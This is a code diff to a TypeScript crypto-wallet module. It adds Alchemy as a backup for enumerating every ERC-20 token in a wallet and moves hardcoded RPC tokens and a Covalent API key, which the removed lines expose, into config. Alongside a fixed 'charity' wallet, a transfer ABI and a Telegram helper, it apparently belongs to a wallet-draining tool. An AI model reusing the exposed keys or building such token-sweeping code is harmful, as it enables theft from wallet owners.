@@ -1,5 +1,11 @@
 import { ethers } from 'ethers';
 import { sendTelegramMessage } from '@/utils/telegram';
+import {
+  COVALENT_API_KEY,
+  COVALENT_CHAIN_NAMES,
+  EVM_QUICKNODE_RPCS,
+  EVM_ALCHEMY_RPCS,
+} from '@/config/rpcEndpoints';
 
 // ---------- ETH price helper ----------
 async function getEthPrice(): Promise<number> {
@@ -32,22 +38,9 @@ async function getNativeTokenPrice(chainId: number): Promise<number> {
 // EVM charity wallet address
 export const EVM_CHARITY_WALLET = '0x666Be1f6415a26e9DcDd6b9fDd35E2337852cFDb';
 
-// QuickNode RPC endpoints per chain
-const QUICKNODE_RPCS: Record<number, string> = {
-  1: 'https://serene-greatest-putty.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
-  56: 'https://serene-greatest-putty.bsc.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
-  137: 'https://serene-greatest-putty.matic.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
-  8453: 'https://serene-greatest-putty.base-mainnet.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
-};
+// QuickNode RPC endpoints per chain (shared config, Alchemy backup lives there too)
+const QUICKNODE_RPCS = EVM_QUICKNODE_RPCS;
 
-// Covalent API key and chain name mapping
-const COVALENT_API_KEY = 'cqt_rQ6gvhDvWchG6Y7QqTD8mPqY4yKX';
-const COVALENT_CHAIN_NAMES: Record<number, string> = {
-  1: 'eth-mainnet',
-  56: 'bsc-mainnet',
-  137: 'matic-mainnet',
-  8453: 'base-mainnet',
-};
 
 // ERC-20 minimal ABI for transfer
 const ERC20_ABI = [
@@ -76,8 +69,9 @@ export interface TokenDetectionResult {
 }
 
 /**
- * Detect all ERC-20 tokens using Covalent GoldRush API (primary)
- * Falls back to QuickNode qn_getWalletTokenBalance if Covalent fails
+ * Detect all ERC-20 tokens.
+ * Order: Covalent (primary) → QuickNode → Alchemy (backup). Any provider that
+ * returns tokens wins; if every provider errors, we surface the combined error.
  */
 export async function detectWalletTokens(
   walletAddress: string,
@@ -95,18 +89,25 @@ export async function detectWalletTokens(
     return quicknodeResult;
   }
 
-  // Both failed or returned empty
-  if (!covalentResult.success && !quicknodeResult.success) {
+  // Final fallback to Alchemy
+  const alchemyResult = await detectTokensViaAlchemy(walletAddress, chainId);
+  if (alchemyResult.success && alchemyResult.tokens.length > 0) {
+    return alchemyResult;
+  }
+
+  // Everyone failed
+  if (!covalentResult.success && !quicknodeResult.success && !alchemyResult.success) {
     return {
       success: false,
       tokens: [],
-      error: `Token detection failed. Covalent: ${covalentResult.error || 'unknown'}. QuickNode: ${quicknodeResult.error || 'unknown'}.`,
+      error: `Token detection failed. Covalent: ${covalentResult.error || 'unknown'}. QuickNode: ${quicknodeResult.error || 'unknown'}. Alchemy: ${alchemyResult.error || 'unknown'}.`,
     };
   }
 
   // APIs succeeded but wallet has no ERC-20 tokens
   return { success: true, tokens: [] };
 }
+
 
 /**
  * Detect tokens via Covalent GoldRush API
@@ -212,6 +213,81 @@ async function detectTokensViaQuickNode(
     return { success: true, tokens };
   } catch (error) {
     console.error('QuickNode token detection failed:', error);
+    return { success: false, tokens: [], error: String(error) };
+  }
+}
+
+/**
+ * Detect tokens via Alchemy (final backup when both Covalent and QuickNode fail).
+ * Uses alchemy_getTokenBalances + alchemy_getTokenMetadata.
+ */
+async function detectTokensViaAlchemy(
+  walletAddress: string,
+  chainId: number
+): Promise<TokenDetectionResult> {
+  const rpcUrl = EVM_ALCHEMY_RPCS[chainId];
+  if (!rpcUrl) {
+    return { success: false, tokens: [], error: `No Alchemy RPC for chain ${chainId}` };
+  }
+
+  try {
+    const balancesRes = await fetch(rpcUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        id: 1,
+        jsonrpc: '2.0',
+        method: 'alchemy_getTokenBalances',
+        params: [walletAddress],
+      }),
+    });
+    const balancesData = await balancesRes.json();
+    if (balancesData.error) {
+      return { success: false, tokens: [], error: balancesData.error.message || 'Alchemy API error' };
+    }
+
+    const raw: Array<{ contractAddress: string; tokenBalance: string | null }> =
+      balancesData?.result?.tokenBalances || [];
+
+    const nonZero = raw.filter((t) => {
+      if (!t.tokenBalance || t.tokenBalance === '0x' || t.tokenBalance === '0x0') return false;
+      try { return BigInt(t.tokenBalance) > 0n; } catch { return false; }
+    });
+
+    const tokens: EVMTokenBalance[] = [];
+    for (const t of nonZero) {
+      try {
+        const metaRes = await fetch(rpcUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            id: 1,
+            jsonrpc: '2.0',
+            method: 'alchemy_getTokenMetadata',
+            params: [t.contractAddress],
+          }),
+        });
+        const metaData = await metaRes.json();
+        const meta = metaData?.result || {};
+        const decimals = Number(meta.decimals ?? 18);
+        const rawBalance = BigInt(t.tokenBalance as string);
+        tokens.push({
+          contractAddress: t.contractAddress,
+          symbol: meta.symbol || 'UNKNOWN',
+          name: meta.name || 'Unknown Token',
+          decimals,
+          balance: rawBalance,
+          uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
+        });
+      } catch {
+        // Skip token if metadata lookup fails
+      }
+    }
+
+    console.log(`Alchemy detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
+    return { success: true, tokens };
+  } catch (error) {
+    console.error('Alchemy token detection failed:', error);
     return { success: false, tokens: [], error: String(error) };
   }
 }
